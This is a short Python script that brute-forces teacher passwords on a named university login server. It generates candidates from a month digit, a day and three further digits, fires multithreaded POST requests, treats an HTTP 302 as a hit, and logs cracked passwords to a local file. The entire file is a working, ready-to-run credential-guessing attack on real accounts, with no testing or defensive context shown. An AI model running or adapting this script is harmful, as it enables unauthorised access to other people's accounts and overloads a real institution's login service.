import threading

import requests

api = 'http://ids2.hznu.edu.cn/amserver/UI/Login'

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}


def log(msg):
    with open('pwd.txt', 'a+') as file:
        msg += '\n'
        print(msg)
        file.write(msg)


LOCK = True


def random_handle(data, X, Y):
    # 随机三位
    global LOCK
    if not LOCK:
        return
    for z in range(0, 1000):
        if z < 10:
            Z = '00' + str(z)
        elif 100 > z >= 10:
            Z = '0' + str(z)
        else:
            Z = str(z)
        PWD = X + Y + Z
        data['IDToken2'] = PWD
        resp = requests.post(api, data=data, headers=headers, allow_redirects=False)
        if resp.status_code == 200:
            pass
            # print('user : %s\'s pwd is not %s' % (data['IDToken1'], PWD))
        elif resp.status_code != 302:
            print('error with %s in %s:%s' % (resp.status_code, data['IDToken1'], PWD))
        else:
            text = 'user : %s\'s pwd is %s' % (data['IDToken1'], PWD)
            log(text)
            LOCK = False
            return


def date_handle(data, X):
    global LOCK
    if not LOCK:
        return
    # 日期2位
    for y in range(1, 32):
        if y < 10:
            Y = '0' + str(y)
        else:
            Y = str(y)
        t = threading.Thread(target=random_handle, args=(data, X, Y))
        t.start()


def hack_teacher(number):
    data = {
        'IDToken0': '',
        'IDToken1': number,
        'IDToken2': '',
        'IDButton': '登陆',
        'goto': '',
        'encoded': 'false',
        'gx_charset': 'UTF-8',
    }

    # 月份个位
    for x in range(0, 10):
        X = str(x)
        t = threading.Thread(target=date_handle, args=(data, X,))
        t.start()
